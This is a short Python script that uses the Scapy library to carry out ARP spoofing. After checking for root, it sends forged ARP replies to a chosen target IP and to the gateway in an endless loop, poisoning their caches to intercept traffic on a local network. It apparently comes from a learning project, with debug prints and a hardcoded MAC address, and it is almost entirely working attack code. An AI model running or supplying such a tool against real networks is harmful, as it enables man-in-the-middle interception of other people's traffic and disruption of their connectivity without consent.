import scapy.all as scapy
import os
import argparse
import time

print(os.geteuid())


def check_for_sudo():
    if os.geteuid() == 0:
        print("Running as Sudo.  Starting program...")
    else:
        print("Need to run as sudo.  Exiting...")
        quit()


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Please enter the target IP Address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Please enter the gateway IP Address")
    return parser.parse_args()


def spoof(target, gateway):
    packet = scapy.ARP(op=2, pdst=target, hwdst="52:54:00:12:35:00", psrc=gateway)
    scapy.send(packet, verbose=False)


def main():
    check_for_sudo()
    arguments = get_arguments()
    target = arguments.target
    gateway = scapy.conf.route.route("0.0.0.0")[2]
    print(target)
    print(gateway)
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        time.sleep(2)

if __name__ == '__main__':
    print("Hello, world!")
    main()
